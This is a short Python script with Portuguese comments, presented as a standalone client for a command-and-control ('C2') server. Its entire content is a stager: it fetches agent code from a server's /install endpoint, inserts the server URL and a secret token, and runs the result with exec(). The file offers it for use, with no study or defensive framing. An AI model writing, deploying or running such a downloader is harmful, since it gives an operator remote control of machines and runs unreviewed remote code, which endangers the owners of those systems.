#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Exemplo de cliente standalone
Para usar: python client_example.py --server http://IP_VPS:5000 --token SEU_TOKEN
"""

import argparse
import urllib.request
import sys

def main():
    parser = argparse.ArgumentParser(description='C2 Admin Client')
    parser.add_argument('--server', required=True, help='URL do servidor (ex: http://192.168.1.100:5000)')
    parser.add_argument('--token', required=True, help='Token secreto')
    
    args = parser.parse_args()
    
    # Baixar e executar agente
    try:
        url = f"{args.server}/install"
        print(f"[*] Conectando ao servidor: {url}")
        
        response = urllib.request.urlopen(url, timeout=10)
        agent_code = response.read().decode('utf-8')
        
        # Substituir configurações
        agent_code = agent_code.replace('SERVER_URL_PLACEHOLDER', args.server)
        agent_code = agent_code.replace('SECRET_TOKEN_PLACEHOLDER', args.token)
        
        print("[*] Código baixado, executando agente...")
        exec(agent_code)
        
    except Exception as e:
        print(f"[!] Erro: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()

